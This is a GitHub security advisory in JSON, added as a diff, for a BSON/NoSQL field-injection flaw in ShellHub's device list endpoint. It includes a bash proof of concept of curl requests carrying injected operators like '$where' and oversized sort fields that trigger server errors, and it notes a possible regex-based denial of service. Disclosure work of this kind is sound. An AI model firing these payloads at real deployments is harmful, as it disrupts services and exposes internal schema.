@@ -1,0 +1,46 @@
+{
+  "id": "GHSA-47r2-v3x6-wff9",
+  "modified": "2026-05-06T23:36:16.160788Z",
+  "published": "2026-05-06T23:28:05Z",
+  "aliases": [
+    "CVE-2026-44425"
+  ],
+  "summary": "ShellHub has crash-DoS via field injection in filter and sort-by parameters",
+  "details": "## Summary\nThe device list endpoint accepts user-controlled identifiers in two places that are passed directly as BSON/SQL keys in the database layer without validation:\n\n  1. The `name` field of each filter property in the base64-encoded `filter`\n     query parameter.\n  2. The `sort_by` query parameter.\n\nAny authenticated user can craft payloads that cause the aggregation/query to fail and the API to return HTTP 500 with no body, with no rate limiting applied.\n\n## Severity\n**CVSS 3.1: 6.5 (Medium)** \nCWE-20 (Improper Input Validation) \nCWE-943 (Improper Neutralization of Special Elements in Data Query Logic)\n\n## Affected versions\nShellHub Community v0.24.1 (validated). All versions sharing the same filter and sort pipeline (`api/store/mongo/query-options.go`).\n\n## Root cause\n\n### Vector 1 — Filter field name\n  `api/store/mongo/query-options.go:140`:\n\n  ```go\n  conditions = append(conditions, bson.M{param.Name: property})\n  ```\n\n`param.Name` is the `name` field from the JSON filter supplied by the client. It becomes a BSON map key with no validation, allowing BSON operator names (`$where`, `$ne`, `$or`, `$regex`) and virtual pipeline-computed fields (`namespace`, paths containing `$`) to be  injected.\n\n### Vector 2 — Sort-by field\nSimilar pattern in the sort pipeline where the `sort_by` query parameter is used to build `bson.M{\"$sort\": {sortBy: order}}` without validation.\n\n### Additional observation\n`fromContains` (`api/store/mongo/internal/filters.go:60-69`) passes user input directly as `$regex` value, which enables blind regex extraction over string fields within the caller's tenant and potential ReDoS amplification on large datasets.\n\n  ```go\n  func fromContains(value interface{}) (bson.M, error) {\n      switch value.(type) {\n      case string:\n          return bson.M{\"$regex\": value, \"$options\": \"i\"}, nil\n  ```\n\n## Proof of concept (validated live against v0.24.1)\n\n  ```bash\n  TOKEN=\u003cvalid-user-jwt\u003e\n\n  # Helper: base64-encode a filter payload\n  encode_filter() {\n    python3 -c 'import json,base64,sys;print(base64.b64encode(json.dumps(json.loads(sys.argv[1])).encode()).decode())' \"$1\"\n  }\n\n  # --- Vector 1: filter field injection ---\n\n  # Baseline: legitimate filter -\u003e 200\n  F=$(encode_filter '[{\"type\":\"property\",\"params\":{\"name\":\"name\",\"operator\":\"contains\",\"value\":\"anything\"}}]')\n  curl -sS -w \"HTTP=%{http_code}\\n\" \"http://target/api/devices?filter=$F\" \\\n    -H \"Authorization: Bearer $TOKEN\"\n  # HTTP=200\n\n  # Exploit 1a: Mongo operator as field name\n  F=$(encode_filter '[{\"type\":\"property\",\"params\":{\"name\":\"$where\",\"operator\":\"contains\",\"value\":\"x\"}}]')\n  curl -sS -w \"HTTP=%{http_code}\\n\" \"http://target/api/devices?filter=$F\" \\\n    -H \"Authorization: Bearer $TOKEN\"\n  # HTTP=500\n\n  # Exploit 1b: nested object as value\n  F=$(encode_filter '[{\"type\":\"property\",\"params\":{\"name\":\"status\",\"operator\":\"eq\",\"value\":{\"$ne\":\"accepted\"}}}]')\n  curl -sS -w \"HTTP=%{http_code}\\n\" \"http://target/api/devices?filter=$F\" \\\n    -H \"Authorization: Bearer $TOKEN\"\n  # HTTP=500\n\n  # Exploit 1c: pipeline-computed field as filter name\n  F=$(encode_filter '[{\"type\":\"property\",\"params\":{\"name\":\"namespace\",\"operator\":\"contains\",\"value\":\".\"}}]')\n  curl -sS -w \"HTTP=%{http_code}\\n\" \"http://target/api/devices?filter=$F\" \\\n    -H \"Authorization: Bearer $TOKEN\"\n  # HTTP=500\n\n  # --- Vector 2: sort-by injection ---\n\n  # Baseline: legitimate sort -\u003e 200\n  curl -sS -w \"HTTP=%{http_code}\\n\" \"http://target/api/devices?sort_by=name\" \\\n    -H \"Authorization: Bearer $TOKEN\"\n  # HTTP=200\n\n  # Exploit 2a: Mongo operator as sort field\n  curl -sS -w \"HTTP=%{http_code}\\n\" \"http://target/api/devices?sort_by=\\$where\" \\\n    -H \"Authorization: Bearer $TOKEN\"\n  # HTTP=500\n\n  # Exploit 2b: path containing $\n  curl -sS -w \"HTTP=%{http_code}\\n\" \"http://target/api/devices?sort_by=_id.%24%24%24\" \\\n    -H \"Authorization: Bearer $TOKEN\"\n  # HTTP=500\n\n  # Exploit 2c: oversized sort field (no length validation)\n  curl -sS -w \"HTTP=%{http_code}\\n\" \"http://target/api/devices?sort_by=$(python3 -c 'print(\"A\"*5000)')\" \\\n    -H \"Authorization: Bearer $TOKEN\"\n  # HTTP=500\n\n  # Exploit 2d: non-indexable internal field\n  curl -sS -w \"HTTP=%{http_code}\\n\" \"http://target/api/devices?sort_by=tenant_id\" \\\n    -H \"Authorization: Bearer $TOKEN\"\n  # HTTP=500\n\n  # --- Repeat to demonstrate no rate limiting ---\n  for i in $(seq 1 20); do\n    curl -sS -o /dev/null -w \"%{http_code} \" \"http://target/api/devices?sort_by=\\$where\" \\\n      -H \"Authorization: Bearer $TOKEN\"\n  done\n  # 500 500 500 500 500 500 500 500 500 500 500 500 500 500 500 500 500 500 500 500\n  ```\n\n  **Confirmed field values that trigger 500:**\n  - Filter name: `$where`, `$regex`, `$or`, `$ne`, `remote_addr`, `tenant_id`, `namespace`, any path containing `$` after a `.`\n  - Sort-by: `$where`, `_id.$$$`, `tenant_id`, `password.hash`, overly long strings\n\n  **Observed response characteristics:**\n  ```\n  HTTP/1.1 500 Internal Server Error\n  Content-Length: 0\n  X-Request-Id: \u003cid\u003e    ← logged as error in backend\n  ```\n\nResponse time 8-18 ms per request, server process stays alive, no degradation across 20 consecutive requests.\n\n## Impact\n  - **Availability (low):** unrestricted HTTP 500 generation by any authenticated caller; log noise, SIEM false-positives, WAF bypass\nfingerprinting.\n  - **Information disclosure (low):** potential stack trace exposure depending on logger configuration; attacker can fingerprint the underlying MongoDB aggregation pipeline and schema.\n  - **Resource exhaustion (potential):** user-controlled `$regex` value on large tenant datasets enables ReDoS amplification (not reproducible on a 2-device test instance, but attack surface is real on production-scale deployments).\n  - **Forensics difficulty:** unified 500 response makes it hard to distinguish legitimate errors from attacker probes in logs.\n\n## Suggested fix\n\n  1. **Allowlist filter and sort field names per collection.** Add a whitelist of allowed `param.Name` and `sort_by` values for each model exposed via filters (`device`, `session`, etc.). Reject anything else with HTTP 400.\n\n  2. **Reject BSON operators in field names.** Even if an allowlist is not practical, reject values that:\n     - start with `$`\n     - contain `$` after a `.`\n     - contain characters outside `[A-Za-z0-9_.]`\n     - exceed a reasonable length (e.g., 64 characters)\n\n  3. **Validate `value` shape.** For `contains`/`eq`/`ne` operators, reject non-primitive values (objects, arrays of objects).\n\n  4. **Catch aggregation errors.** In `api/store/mongo/query-options.go`,  wrap pipeline execution and return a typed error that the HTTP layer maps to 400 Bad Request instead of 500.\n\n  5. **Limit regex complexity.** In `fromContains`, reject regex values longer than N characters or containing nested quantifiers (`(...)+`, `(...)*`, `(.+)+`, etc.) to mitigate ReDoS.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/shellhub-io/shellhub",
+        "purl": "pkg:golang/github.com/shellhub-io/shellhub"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.24.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.24.1",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-47r2-v3x6-wff9/GHSA-47r2-v3x6-wff9.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/shellhub-io/shellhub/security/advisories/GHSA-47r2-v3x6-wff9"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/shellhub-io/shellhub"
+    }
+  ]
+}
